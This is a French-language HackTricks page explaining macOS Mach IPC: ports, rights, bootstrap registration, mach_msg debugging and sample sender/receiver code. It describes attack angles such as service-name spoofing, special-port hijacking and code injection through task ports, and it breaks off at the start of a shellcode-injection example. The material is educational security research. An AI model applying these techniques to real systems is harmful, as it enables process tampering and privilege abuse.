# macOS IPC - Communication inter-processus

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Informations de base

Mach utilise les **tasks** comme la **plus petite unité** pour le partage de ressources, et chaque task peut contenir **plusieurs threads**. Ces **tasks et threads sont mappés 1:1 aux processus et threads POSIX**.

La communication entre tasks s'effectue via Mach Inter-Process Communication (IPC), en utilisant des canaux de communication unidirectionnels. **Les messages sont transférés entre des ports**, qui agissent un peu comme des **queues de messages** gérées par le kernel.

Un **port** est l'élément **de base** du Mach IPC. Il peut être utilisé pour **envoyer des messages et pour en recevoir**.

Chaque processus possède une **table IPC**, dans laquelle il est possible de trouver les **mach ports du processus**. Le nom d'un mach port est en réalité un numéro (un pointeur vers l'objet kernel).

Un processus peut aussi envoyer un nom de port avec certains droits **à un autre task** et le kernel fera apparaître cette entrée dans la **table IPC de l'autre task**.

### Port Rights

Les port rights, qui définissent quelles opérations un task peut effectuer, sont essentielles pour cette communication. Les **port rights** possibles sont ([définitions depuis ici](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)) :

- **Receive right**, qui permet de recevoir les messages envoyés au port. Les Mach ports sont MPSC (multiple-producer, single-consumer) queues, ce qui signifie qu'il ne peut y avoir **qu'un seul Receive right pour chaque port** dans tout le système (contrairement aux pipes, où plusieurs processus peuvent détenir des descripteurs de fichier pour l'extrémité lecture d'un pipe).
- Un **task possédant le Receive** right peut recevoir des messages et **créer des Send rights**, lui permettant d'envoyer des messages. À l'origine, seul le **task propriétaire a le Receive right sur son port**.
- Si le propriétaire du Receive right **meurt** ou le détruit, le **send right devient inutile (dead name)**.
- **Send right**, qui permet d'envoyer des messages au port.
- Le Send right peut être **cloné** : un task possédant un Send right peut cloner le right et **le céder à un troisième task**.
- Notez que les **port rights** peuvent aussi être **passés** via des Mac messages.
- **Send-once right**, qui permet d'envoyer un seul message au port puis disparaît.
- Ce right **ne peut pas** être **cloné**, mais il peut être **déplacé**.
- **Port set right**, qui désigne un _port set_ plutôt qu'un seul port. Déqueue d'un message depuis un port set extrait un message d'un des ports qu'il contient. Les port sets peuvent être utilisés pour écouter plusieurs ports simultanément, de manière similaire à `select`/`poll`/`epoll`/`kqueue` sous Unix.
- **Dead name**, qui n'est pas un véritable port right, mais simplement un placeholder. Lorsque un port est détruit, tous les port rights existants pour ce port se transforment en dead names.

**Les tasks peuvent transférer des SEND rights à d'autres**, leur permettant d'envoyer des messages en retour. **Les SEND rights peuvent aussi être clonés, de sorte qu'un task peut dupliquer et donner le right à un troisième task**. Ceci, combiné à un processus intermédiaire connu sous le nom de **bootstrap server**, permet une communication efficace entre tasks.

### File Ports

Les file ports permettent d'encapsuler des descripteurs de fichier dans des Mac ports (en utilisant des mach port rights). Il est possible de créer un `fileport` à partir d'un FD donné en utilisant `fileport_makeport` et de créer un FD à partir d'un fileport en utilisant `fileport_makefd`.

### Établir une communication

Comme mentionné précédemment, il est possible d'envoyer des rights via des Mach messages, cependant, vous **ne pouvez pas envoyer un right sans déjà avoir le right** d'envoyer un message Mach. Alors, comment la première communication est-elle établie ?

Pour cela, le **bootstrap server** (**launchd** sur mac) est impliqué : comme **n'importe qui peut obtenir un SEND right vers le bootstrap server**, il est possible de lui demander un right pour envoyer un message à un autre processus :

1. Le task **A** crée un **nouveau port**, obtenant le **RECEIVE right** sur celui-ci.
2. Le task **A**, étant détenteur du RECEIVE right, **génère un SEND right pour le port**.
3. Le task **A** établit une **connexion** avec le **bootstrap server**, et **lui envoie le SEND right** pour le port qu'il a généré au début.
- Rappelez-vous que n'importe qui peut obtenir un SEND right vers le bootstrap server.
4. Le task A envoie un message `bootstrap_register` au bootstrap server pour **associer le port donné à un nom** comme `com.apple.taska`
5. Le task **B** interagit avec le **bootstrap server** pour effectuer une **lookup bootstrap** du nom du service (`bootstrap_lookup`). Pour que le bootstrap server puisse répondre, le task B lui enverra un **SEND right vers un port qu'il a préalablement créé** dans le message de lookup. Si le lookup réussit, le **server duplique le SEND right** reçu du Task A et **le transmet au Task B**.
- Rappelez-vous que n'importe qui peut obtenir un SEND right vers le bootstrap server.
6. Avec ce SEND right, **le Task B** est capable **d'envoyer** un **message** **au Task A**.
7. Pour une communication bidirectionnelle, généralement le task **B** génère un nouveau port avec un **RECEIVE** right et un **SEND** right, et donne le **SEND right au Task A** afin qu'il puisse envoyer des messages vers le TASK B (communication bidirectionnelle).

Le bootstrap server **ne peut pas authentifier** le nom de service revendiqué par un task. Cela signifie qu'un **task** pourrait potentiellement **usurper n'importe quel task système**, par exemple en **prétendant être un service d'autorisation** et en approuvant ensuite chaque requête.

Apple stocke ensuite les **noms des services fournis par le système** dans des fichiers de configuration sécurisés, situés dans des répertoires protégés par SIP : `/System/Library/LaunchDaemons` et `/System/Library/LaunchAgents`. Aux côtés de chaque nom de service, le **binaire associé est aussi stocké**. Le bootstrap server créera et maintiendra un **RECEIVE right pour chacun de ces noms de service**.

Pour ces services prédéfinis, le **processus de lookup diffère légèrement**. Lorsqu'un nom de service est recherché, launchd démarre le service dynamiquement. Le nouveau flux de travail est le suivant :

- Le task **B** initie un **lookup** bootstrap pour un nom de service.
- **launchd** vérifie si le task est en cours d'exécution et, s'il ne l'est pas, le **démarre**.
- Le task **A** (le service) effectue un **bootstrap check-in** (`bootstrap_check_in()`). Ici, le **bootstrap** server crée un SEND right, le conserve, et **transfère le RECEIVE right au Task A**.
- launchd duplique le **SEND right et l'envoie au Task B**.
- Le Task **B** génère un nouveau port avec un **RECEIVE** right et un **SEND** right, et donne le **SEND right au Task A** (le svc) afin qu'il puisse envoyer des messages au TASK B (communication bidirectionnelle).

Cependant, ce processus ne s'applique qu'aux tasks système prédéfinis. Les tasks non système fonctionnent toujours comme décrit initialement, ce qui pourrait potentiellement permettre l'usurpation.

> [!CAUTION]
> Par conséquent, launchd ne doit jamais planter sous peine de faire planter tout le système.

### A Mach Message

[Plus d'infos ici](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

La fonction `mach_msg`, essentiellement un syscall, est utilisée pour envoyer et recevoir des Mach messages. La fonction requiert que le message à envoyer soit passé en premier argument. Ce message doit commencer par une structure `mach_msg_header_t`, suivie par le contenu réel du message. La structure est définie comme suit:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

Le champ initial **`msgh_bits`** est une bitmap :

- Le premier bit (le plus significatif) est utilisé pour indiquer qu'un message est complexe (plus d'informations ci-dessous)
- Le 3e et le 4e sont utilisés par le kernel
- Les **5 bits de poids faible du 2ᵉ octet** peuvent être utilisés pour **voucher** : un autre type de port pour envoyer des paires clé/valeur.
- Les **5 bits de poids faible du 3ᵉ octet** peuvent être utilisés pour **local port**
- Les **5 bits de poids faible du 4ᵉ octet** peuvent être utilisés pour **remote port**

Les types qui peuvent être spécifiés dans les ports voucher, local et remote sont (d'après [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)) :
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Par exemple, `MACH_MSG_TYPE_MAKE_SEND_ONCE` peut être utilisé pour **indiquer** qu'un **send-once** **right** doit être dérivé et transféré pour ce port. On peut aussi spécifier `MACH_PORT_NULL` pour empêcher que le destinataire puisse répondre.

Pour établir une **communication bidirectionnelle** simple, un processus peut spécifier un **mach port** dans le mach **message header** appelé le _reply port_ (**`msgh_local_port`**) où le **récepteur** du message peut **envoyer une réponse** à ce message.

> [!TIP]
> Notez que ce type de communication bidirectionnelle est utilisé dans les messages XPC qui attendent une réponse (`xpc_connection_send_message_with_reply` et `xpc_connection_send_message_with_reply_sync`). Mais **généralement différents ports sont créés** comme expliqué précédemment pour établir la communication bidirectionnelle.

Les autres champs de l'en-tête de message sont :

- `msgh_size`: la taille du paquet entier.
- `msgh_remote_port`: le port sur lequel ce message est envoyé.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: l'ID de ce message, qui est interprété par le destinataire.

> [!CAUTION]
> Notez que **mach messages are sent over a `mach port`**, qui est un canal de communication à **récepteur unique**, **plusieurs expéditeurs** intégré dans le noyau mach. **Plusieurs processus** peuvent **envoyer des messages** à un mach port, mais à tout moment **un seul processus peut lire** à partir de celui-ci.

Les messages sont ensuite formés par l'en-tête **`mach_msg_header_t`** suivi du **corps** et du **trailer** (le cas échéant) et peuvent accorder la permission d'y répondre. Dans ces cas, le noyau a juste besoin de transférer le message d'une tâche à l'autre.

Un **trailer** est **une information ajoutée au message par le noyau** (ne peut pas être définie par l'utilisateur) qui peut être demandée lors de la réception du message avec les flags `MACH_RCV_TRAILER_<trailer_opt>` (il existe différentes informations qui peuvent être demandées).

#### Messages complexes

Cependant, il existe d'autres messages plus **complexes**, comme ceux qui transmettent des droits de port additionnels ou partagent de la mémoire, où le noyau doit également envoyer ces objets au destinataire. Dans ces cas, le bit de poids le plus significatif de l'en-tête `msgh_bits` est défini.

Les descripteurs possibles à transmettre sont définis dans [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) :
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
En 32bits, tous les descripteurs font 12B et le type du descripteur est dans le 11e octet. En 64 bits, les tailles varient.

> [!CAUTION]
> Le kernel copiera les descripteurs d'une task à l'autre mais crée d'abord **une copie en mémoire kernel**. Cette technique, connue sous le nom de "Feng Shui", a été abusée dans plusieurs exploits pour forcer le **kernel à copier des données dans sa mémoire**, faisant qu'un process envoie des descripteurs à lui‑même. Ensuite le process peut recevoir les messages (le kernel les libérera).
>
> Il est aussi possible d'**envoyer des port rights à un process vulnérable**, et les port rights apparaîtront simplement dans le process (même s'il ne les manipule pas).

### Mac Ports APIs

Notez que les ports sont associés au task namespace, donc pour créer ou rechercher un port, le task namespace est aussi interrogé (plus dans `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`** : **Créer** un port.
- `mach_port_allocate` peut aussi créer un **port set** : receive right sur un groupe de ports. Quand un message est reçu, on indique le port d'où il provient.
- `mach_port_allocate_name` : Changer le nom du port (par défaut entier 32 bits)
- `mach_port_names` : Obtenir les noms de ports depuis une cible
- `mach_port_type` : Obtenir les droits d'une task sur un nom
- `mach_port_rename` : Renommer un port (comme dup2 pour les FDs)
- `mach_port_allocate` : Allouer un nouveau RECEIVE, PORT_SET ou DEAD_NAME
- `mach_port_insert_right` : Créer un nouveau right dans un port où vous avez RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`** : Fonctions utilisées pour **envoyer et recevoir des mach messages**. La version overwrite permet de spécifier un buffer différent pour la réception du message (l'autre version réutilisera simplement le même).

### Debug mach_msg

Comme les fonctions **`mach_msg`** et **`mach_msg_overwrite`** sont celles utilisées pour envoyer et recevoir des messages, placer un breakpoint dessus permettra d'inspecter les messages envoyés et reçus.

Par exemple, démarrez le débogage de n'importe quelle application que vous pouvez déboguer car elle chargera **`libSystem.B` qui utilisera cette fonction**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Pour obtenir les arguments de **`mach_msg`** vérifiez les registres. Voici les arguments (extrait de [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)) :
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Récupérer les valeurs des registres :
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspectez l'en-tête du message en vérifiant le premier argument :
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ce type de `mach_msg_bits_t` est très courant pour permettre une réponse.

### Énumérer les ports
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Le **nom** est le nom par défaut attribué au port (vérifiez comment il **augmente** dans les 3 premiers octets). Le **`ipc-object`** est l'**identifiant** unique **obfusqué** du port.\
Remarquez aussi comment les ports disposant uniquement du droit **`send`** **identifient leur propriétaire** (nom du port + pid).\
Notez aussi l'utilisation de **`+`** pour indiquer **d'autres tâches connectées au même port**.

Il est aussi possible d'utiliser [**procesxp**](https://www.newosxbook.com/tools/procexp.html) pour voir également les **noms de services enregistrés** (avec SIP désactivé en raison du besoin de `com.apple.system-task-port`):
```
procesp 1 ports
```
Vous pouvez installer cet outil sur iOS en le téléchargeant depuis [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemple de code

Remarquez comment le **sender** **allocates** un port, crée un **send right** pour le nom `org.darlinghq.example` et l'envoie au **bootstrap server**, tandis que le **sender** a demandé le **send right** de ce nom et l'a utilisé pour **send a message**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Ports privilégiés

Il existe certains ports spéciaux qui permettent de **réaliser certaines actions sensibles ou d'accéder à certaines données sensibles** si une tâche dispose des permissions **SEND** sur ceux-ci. Cela rend ces ports très intéressants du point de vue d'un attaquant, non seulement pour les capacités qu'ils offrent mais aussi parce qu'il est possible de **partager les permissions SEND entre tâches**.

### Host Special Ports

Ces ports sont représentés par un nombre.

Les droits **SEND** peuvent être obtenus en appelant **`host_get_special_port`** et les droits **RECEIVE** en appelant **`host_set_special_port`**. Cependant, les deux appels exigent le port **`host_priv`** auquel seul root peut accéder. De plus, par le passé root pouvait appeler **`host_set_special_port`** et détourner arbitrairement des ports, ce qui permettait par exemple de contourner les signatures de code en détournant `HOST_KEXTD_PORT` (SIP empêche maintenant cela).

Ils sont divisés en 2 groupes : les **7 premiers ports appartiennent au kernel**, étant le 1 `HOST_PORT`, le 2 `HOST_PRIV_PORT`, le 3 `HOST_IO_MASTER_PORT` et le 7 `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Ceux commençant **à partir** du numéro **8** sont **possédés par des daemons système** et ils sont déclarés dans [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port** : Si un processus a le privilège **SEND** sur ce port, il peut obtenir des **informations** sur le **système** en appelant des routines comme :
  - `host_processor_info` : Obtenir des infos sur le processeur
  - `host_info` : Obtenir des infos sur l'host
  - `host_virtual_physical_table_info` : Table virtuelle/physique des pages (requires MACH_VMDEBUG)
  - `host_statistics` : Obtenir des statistiques de l'host
  - `mach_memory_info` : Obtenir la disposition de la mémoire du kernel
- **Host Priv port** : Un processus disposant du droit **SEND** sur ce port peut effectuer des **actions privilégiées** comme afficher des données de boot ou tenter de charger une kernel extension. Le **processus doit être root** pour obtenir cette permission.
- De plus, pour appeler l'API **`kext_request`**, il est nécessaire d'avoir d'autres entitlements **`com.apple.private.kext*`** qui ne sont accordés qu'aux binaires Apple.
- D'autres routines pouvant être appelées :
  - `host_get_boot_info` : Obtenir `machine_boot_info()`
  - `host_priv_statistics` : Obtenir des statistiques privilégiées
  - `vm_allocate_cpm` : Allouer de la Contiguous Physical Memory
  - `host_processors` : Envoyer un droit aux processeurs de l'host
  - `mach_vm_wire` : Rendre la mémoire résidente
- Comme **root** peut accéder à cette permission, il pourrait appeler `host_set_[special/exception]_port[s]` pour **détourner les host special ou exception ports**.

Il est possible de **voir tous les host special ports** en exécutant :
```bash
procexp all ports | grep "HSP"
```
### Ports spéciaux de tâche

Ce sont des ports réservés aux services bien connus. Il est possible de les obtenir/définir en appelant `task_[get/set]_special_port`. Ils se trouvent dans `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Extrait de [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: Le port utilisé pour contrôler ce task. Utilisé pour envoyer des messages qui affectent le task. C'est le port renvoyé par **mach_task_self (voir Task Ports ci-dessous)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Le bootstrap port du task. Utilisé pour envoyer des messages demandant le retour d'autres system service ports.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Le port utilisé pour demander des informations sur l'host contenant. C'est le port renvoyé par **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Le port nommant la source depuis laquelle ce task puise sa wired kernel memory.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Le port nommant la source depuis laquelle ce task puise sa default memory managed memory.

### Task Ports

À l'origine Mach n'avait pas de "processes", il avait des "tasks" considérées comme des conteneurs de threads. Quand Mach a été fusionné avec BSD, **chaque task a été corrélé avec un process BSD**. Donc chaque process BSD possède les détails nécessaires pour être un process et chaque Mach task a aussi son fonctionnement interne (sauf pour le pid inexistant 0 qui est le `kernel_task`).

Il y a deux fonctions très intéressantes liées à cela :

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtient un SEND right pour le task port du task lié au `pid` spécifié et le donne au `target_task_port` indiqué (qui est généralement le task appelant ayant utilisé `mach_task_self()`, mais peut être un port SEND sur un autre task).
- `pid_for_task(task, &pid)`: Étant donné un SEND right vers un task, trouve à quel PID ce task est lié.

Pour effectuer des actions à l'intérieur du task, le task a besoin d'un `SEND` right vers lui-même en appelant `mach_task_self()` (qui utilise le `task_self_trap` (28)). Avec cette permission un task peut effectuer plusieurs actions comme :

- `task_threads`: Obtenir des SEND right sur tous les task ports des threads du task
- `task_info`: Obtenir des infos sur un task
- `task_suspend/resume`: Suspendre ou reprendre un task
- `task_[get/set]_special_port`
- `thread_create`: Créer un thread
- `task_[get/set]_state`: Contrôler l'état du task
- et plus peut être trouvé dans [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Remarquez qu'avec un SEND right sur un task port d'un **different task**, il est possible d'effectuer ces actions sur un autre task.

De plus, le task_port est aussi le port **`vm_map`** qui permet de **lire et manipuler la mémoire** à l'intérieur d'un task avec des fonctions comme `vm_read()` et `vm_write()`. Cela signifie essentiellement qu'un task avec des SEND rights sur le task_port d'un autre task pourra **injecter du code dans ce task**.

Souvenez-vous que parce que le **kernel est aussi un task**, si quelqu'un parvient à obtenir des **SEND permissions** sur le **`kernel_task`**, il pourra faire exécuter n'importe quoi par le kernel (jailbreaks).

- Appelez `mach_task_self()` pour **obtenir le name** de ce port pour le task appelant. Ce port n'est **hérité** qu'à travers **`exec()`** ; un nouveau task créé avec `fork()` obtient un nouveau task port (comme cas particulier, un task obtient aussi un nouveau task port après `exec()` dans un binaire suid). La seule façon de lancer un task et d'obtenir son port est d'effectuer la ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) pendant un `fork()`.
- Ce sont les restrictions pour accéder au port (depuis `macos_task_policy` dans le binaire `AppleMobileFileIntegrity`) :
- Si l'app a l'entitlement **`com.apple.security.get-task-allow`** les processes du **même user peuvent accéder au task port** (ajouté couramment par Xcode pour le debugging). Le processus de **notarization** ne le permettra pas pour les releases en production.
- Les apps avec l'entitlement **`com.apple.system-task-ports`** peuvent obtenir le **task port pour n'importe quel** process, sauf le kernel. Dans les versions plus anciennes c'était appelé **`task_for_pid-allow`**. Ceci est seulement accordé aux applications Apple.
- **Root peut accéder aux task ports** d'applications **non** compilées avec un runtime **hardened** (et pas d'Apple).

**The task name port:** Une version non-privileged du _task port_. Il référence le task, mais ne permet pas de le contrôler. La seule chose qui semble disponible via celui-ci est `task_info()`.

### Thread Ports

Les threads ont aussi des ports associés, visibles depuis le task appelant **`task_threads`** et depuis le processeur avec `processor_set_threads`. Un SEND right vers le thread port permet d'utiliser les fonctions du subsystem `thread_act`, comme :

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Tout thread peut obtenir ce port en appelant **`mach_thread_self`**.

### Shellcode Injection in thread via Task port

Vous pouvez récupérer un shellcode depuis :


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
